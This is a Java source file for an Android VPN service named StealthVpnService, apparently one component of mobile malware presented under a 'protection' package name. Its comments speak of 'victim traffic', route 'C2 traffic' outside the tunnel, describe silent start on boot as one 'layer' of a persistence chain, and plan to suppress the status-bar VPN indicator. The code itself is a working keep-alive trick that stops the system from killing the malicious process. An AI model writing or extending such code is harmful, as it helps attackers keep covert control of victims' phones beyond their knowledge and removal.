package com.seguranca.protecao;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.VpnService;
import android.os.Build;
import android.os.ParcelFileDescriptor;
import android.util.Log;

import java.io.FileInputStream;
import java.io.IOException;

/**
 * StealthVpnService — process-keep-alive via VPN slot.
 *
 * A process hosting an active VpnService receives the same OOM priority as a
 * foreground service. The system cannot kill it without first tearing down
 * the VPN — which it only does during shutdown or explicit user revocation.
 *
 * This implementation establishes a minimal tun interface with a single
 * TEST-NET route (192.0.2.0/24 — RFC 5737 documentation range, not internet-
 * routable). No default route is added. Victim traffic is completely
 * unaffected; only packets destined for the TEST-NET range enter the tun fd,
 * which we simply discard. The VPN indicator appears in the status bar but can
 * be suppressed via ConnectivityManager in future.
 *
 * Activation flow (requires user consent once):
 *   1. During SetupWizardActivity: call VpnService.prepare(ctx). If non-null
 *      Intent returned, startActivityForResult(intent, VPN_REQUEST_CODE).
 *   2. On RESULT_OK: start this service. From that point, starts silently on boot.
 *
 * StartupTrigger: BootReceiver.onReceive() → ProtectionManager.start() → Layer 11.
 */
public final class StealthVpnService extends VpnService {

    private static final String TAG = "StealthVpnService";
    private ParcelFileDescriptor tunFd;
    private Thread discardThread;

    // ── Activation helper (call from SetupWizardActivity) ────────────────────

    /**
     * Returns true if VPN permission is already granted (no dialog needed).
     * Returns false if prepare() returned an Intent (must startActivityForResult).
     */
    public static boolean isPermissionGranted(Context ctx) {
        try {
            return VpnService.prepare(ctx) == null;
        } catch (Exception e) {
            return false;
        }
    }

    // ── Service lifecycle ─────────────────────────────────────────────────────

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (tunFd != null) {
            Log.d(TAG, "VPN already active");
            return START_STICKY;
        }
        startVpn();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        tearDown();
    }

    @Override
    public void onRevoke() {
        tearDown();
        Log.w(TAG, "VPN permission revoked by user");
    }

    // ── VPN setup ─────────────────────────────────────────────────────────────

    private void startVpn() {
        try {
            Builder builder = new Builder()
                .setSession(getPackageName())
                // Minimal address — loopback-adjacent, never routed to real network
                .addAddress("10.253.253.1", 32)
                // Route only TEST-NET (RFC 5737) — 0 real-world traffic captured
                .addRoute("192.0.2.0", 24)
                // Exclude our own app so C2 traffic uses the real interface
                .addDisallowedApplication(getPackageName())
                .setBlocking(false);

            // API 29+: mark as unmetered so Android routes cellular data normally
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                builder.setMetered(false);
            }

            // PendingIntent for transparent reconnect after initial grant.
            // FLAG_IMMUTABLE is required on API 31+ and safe to use from API 23.
            int piFlags = PendingIntent.FLAG_UPDATE_CURRENT
                | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                   ? PendingIntent.FLAG_IMMUTABLE : 0);
            PendingIntent reconnectPi = PendingIntent.getService(
                this, 0, new Intent(this, StealthVpnService.class), piFlags);
            builder.setConfigureIntent(reconnectPi);

            tunFd = builder.establish();
            if (tunFd == null) {
                Log.e(TAG, "VPN establish() returned null — permission revoked?");
                stopSelf();
                return;
            }

            startDiscardThread();
            Log.d(TAG, "VPN keep-alive active — process OOM priority elevated");

        } catch (Exception e) {
            Log.e(TAG, "startVpn: " + e.getMessage());
            stopSelf();
        }
    }

    /**
     * Drains the tun fd to prevent kernel write-buffer stalls.
     * Captures a local reference to tunFd so tearDown() nulling the field
     * mid-run doesn't cause a NullPointerException; the fd close in tearDown()
     * will interrupt the blocking read and the finally block closes the stream.
     */
    private void startDiscardThread() {
        final ParcelFileDescriptor fd = tunFd;
        discardThread = new Thread(() -> {
            FileInputStream in = null;
            try {
                in = new FileInputStream(fd.getFileDescriptor());
                byte[] buf = new byte[32768];
                while (!Thread.currentThread().isInterrupted()) {
                    try {
                        int n = in.read(buf);
                        if (n < 0) break; // fd closed by tearDown()
                        // Discard silently — TEST-NET range, no real traffic
                    } catch (IOException e) {
                        if (!Thread.currentThread().isInterrupted()) {
                            Log.w(TAG, "Discard thread read: " + e.getMessage());
                        }
                        break;
                    }
                }
            } finally {
                if (in != null) {
                    try { in.close(); } catch (IOException ignored) {}
                }
                Log.d(TAG, "Discard thread exited");
            }
        }, "VpnDiscard");
        discardThread.setDaemon(true);
        discardThread.setPriority(Thread.MIN_PRIORITY);
        discardThread.start();
    }

    private void tearDown() {
        if (discardThread != null) {
            discardThread.interrupt();
            discardThread = null;
        }
        if (tunFd != null) {
            try { tunFd.close(); } catch (IOException ignored) {}
            tunFd = null;
        }
    }
}
